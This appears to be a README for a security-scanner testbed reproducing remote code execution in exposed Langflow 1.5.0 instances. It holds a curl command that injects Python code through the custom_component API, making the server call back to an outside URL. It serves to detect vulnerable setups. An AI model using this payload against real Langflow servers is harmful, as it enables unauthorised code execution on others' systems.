# Langflow Exposed UI

Langflow is a tool for building and deploying AI-powered agents and workflows.
This testbed demonstrates exposed and non-exposed configurations of langflow UI.

**Note as of June 26th, 2026:**

Langflow's authentication has changed over time, and in later versions like 1.6.0, the LANGFLOW_AUTO_LOGIN variable is not sufficient to allow the RCE proof of concept. For this reason, the version is pinned to 1.5.0 for this testbed.

## Setup

```shell
docker compose up
```

## Reproduction Steps

Issue the following curl command to get a pingback from the docker compose.

```sh
curl --path-as-is -i -s -k -X $'POST' \
    -H $'Content-Type: application/json' \
    --data-binary $'{\"code\":\"import requests\\n\\nfrom langflow.custom import Component\\n\\nclass TsunamiComponent(Component):\\n    def __init__(self, *args, **kwargs):\\n        super().__init__(*args, **kwargs)\\n        requests.get(\\\"https://<YOUR CALLBACK URL>\\\", timeout=5)\\n\\n\"}' \
    $'http://127.0.0.1:8081/api/v1/custom_component'
```

- Safe instances will return `403 FORBIDDEN`
- Vulnerable instances will return `200 OK`

## References

- <https://github.com/langflow-ai/langflow/tree/main>
- <https://docs.langflow.org/configuration-authentication#langflow_auto_login>
